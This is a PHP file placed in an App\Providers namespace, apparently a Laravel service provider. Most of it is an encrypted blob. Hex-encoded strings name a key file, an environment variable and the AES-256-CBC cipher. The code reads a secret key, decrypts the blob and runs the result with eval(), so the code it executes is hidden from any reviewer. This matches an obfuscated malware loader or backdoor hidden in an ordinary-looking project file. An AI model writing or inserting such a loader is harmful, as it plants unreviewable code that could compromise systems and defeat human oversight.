<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('EG6JJL6N8g9SRtNGvGKUVQ==');

$c=base64_decode(

'78EnZdWUYo8CdrFSvzC0n+n5sLz7f7iMg4fNSc4D70uc6wwr4i5gt908fOOGQppxU1HKNDFJj2W/' .
'4Cyqlx+7PVqIhFjBK6mY9VeeN8HtQT7zYXp9AJQYy0R+F/lBSmuZ876urbG3cKxepvejeiAicVie' .
'ny6k+ISqVtBWp/ZafpYOvnXedPzy6kf9a61iwN6bUQuDp7BB/s+axXazXGvMVwWVAI7vDkk/tegj' .
'wfXi9caqPb0tJm2/mhOyb5tIojCg/HNhch/U7HqjTPpB7HVwx1g4p26Kr298+emN5eowlULLmn5m' .
'ps+zMQQ9RL3naCNuaJutdXygQzLG4j/TjZSaOY2Gb6D3qvR25Bm5DsiqkW/c/fFY+NXvG04Xpi83' .
'ZgdpAXvUwX8UVru9DEPpNujqe8Z6NscJz0tCmfQ8GBMNTFkMcnOKd8kbCYsnTFAB590djghwUIFi' .
'PCej0SyRtc9UNMUIQBQW7fCOCv80fX3HsROU/hT+NlATy/ZRmacUfQNLIOS64IklYdiPvDuPHiCj' .
'FHqJZEkoqjTIeG0XuLAulrN7SGRbj5239pCxQcxYn3Xfzu1S/IkzsfD/bfDfls+40wpnue6Rzkac' .
'WIp5D7dp/2vNURP9IgtA/MmVyoEFILquRJ99mcqU9QtTIUfB8QiweoHIVuzaCelHtCguEWfOD7KY' .
'JrcAUUfcUNNwu/5ShmOlCoNoGrb7M68hYzN6DcUAC/Nq+dqut2JQs5W66Jwa0m8DlFjwMPeTaYK8' .
'uaUpFscUtL4Nn0xBASIwaiauxLtoFMkOzJ8YUjAzI7897N2sN/httZbXOvhaZXx6zCd0pkw5gWwX' .
'TcAytLPpKJKQJ1IIvCRR4bcaK5px8D0PZzbNIpSlLtzer3ioPD+gujKbCshinP0B3TbPxoxxTDmJ' .
'b2YQWvFTSbx3XOGUFfdYo6pwowOHzyOU2kJ5XTpe3TfoXrXur5v1snTZP5c5BjzbP0E0vZ5VtjIS' .
'OWu2z5ffxddNgQfUxA6Z6mn/sclfLh1hznU0kw+G6/o2ooj5cP5LOsrQjgXqXON5eFudGwcsWT6p' .
'mHCFkfl2FP+COGXy1ZFt6YfTO5toUQkat8JuqiD0abh0jxHYD6t8UHMcfitIlJFVpb09s1N916OV' .
'CKXJbMzK8gZDqS955qfeShLftCOgrKGGAnjNAdWcklCIcM7oZE/cQ1ulpDNuh6Xut8m5m3Mc/Fyl' .
'Ir8sA4M1p9EMlpLGsyxrVGTfpisrwkdvUxgZTZ8Fmik2Mc9rd5TV0GiSdyA16HreSxUJm8eGsWnY' .
'/QZOSVkMURVswRYWg7sca6LGaArpq8DiMIlDXWK45UbphuVrQW377tWlc6JM/NgIX+rLAVwr9KHy' .
'80/VVjzUUHJZ8cGZLWgW4xSNI9aYrFGNTViLtO3AdYEU/bf4+xkG7zYOpfvqqGumNXMT9ZMxuB11' .
'IUNl8+ip1N9hYEaPj3tkn8lwXGBgUAiPf7aqoUk+Gog4KOUP4spTVF79S2yrUIhxqo0skisUlq03' .
'+z7TYsBEr6RHehIQQoVh35B5p4NQ/QPK0xMo5UrYIbtchdpSJmQITtO5kMa3qWevhov5n23TdLdJ' .
'NN8RBGkr/GaZWDgKBhr40NZtqVeeWH7J31Q3FqvN3MNfyOA='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

